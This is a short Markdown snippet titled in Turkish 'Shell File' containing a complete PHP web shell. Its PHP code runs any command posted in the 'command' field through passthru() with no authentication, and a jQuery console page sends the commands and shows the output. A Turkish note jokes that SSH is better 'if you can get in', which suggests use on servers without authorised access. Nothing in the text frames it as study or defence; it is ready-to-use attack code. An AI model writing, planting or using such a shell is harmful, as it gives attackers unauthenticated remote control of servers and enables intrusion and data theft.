#### Shell Dosyası
```
<?php
$command = $_POST["command"];
if(isset($command))
{
	passthru($command);
	die();
}
?>
<html>
    <head>	
	<script   src="http://code.jquery.com/jquery-2.2.4.min.js"   integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44="   crossorigin="anonymous"></script>
    	<meta charset = "utf-8">
    </head>
    <body>
	<div id = "result_area">
	    <ul>
		<li><span>Info : </span> Bu adam akıllı bi konsol değildir, yazdığınız her kod çalışmaz, daha iyisi için server'a ssh'dan bağlanın. Tabi girebiliyosanız. </li>
	    </ul>
	</div>
	    <div id = "form">
		<input type = "text" id ="command" name = "command">
	    </div>
    </body>
</html>

<script>
	$(document).ready(function(){
		$('#command').keypress(function(event){
			var keycode = (event.keyCode ? event.keyCode : event.which);
			if(keycode == '13'){
				request();
			}
		});		
	});

	function request(){
		$.ajax({
		  type: "POST",
		  url: "",
		  data: {
				command: $('#command').val()			
			},
		  success: function(data){
				$("#result_area ul").append("<li><span>#server : </span> "+data+"</li>");
				$('#command').val("");
			}
		});
	}
</script>

<style>
	#result_area{
		background-color:black;
		height: 90%;
		color:white;
		padding : 0;
	}
	input{
		width:100%;
		height:10%;
	}
	#result_area ul{
		list-style:none;
		padding :5px;
	}
	li > span{
		color: lightgreen;
	}
</style>
```
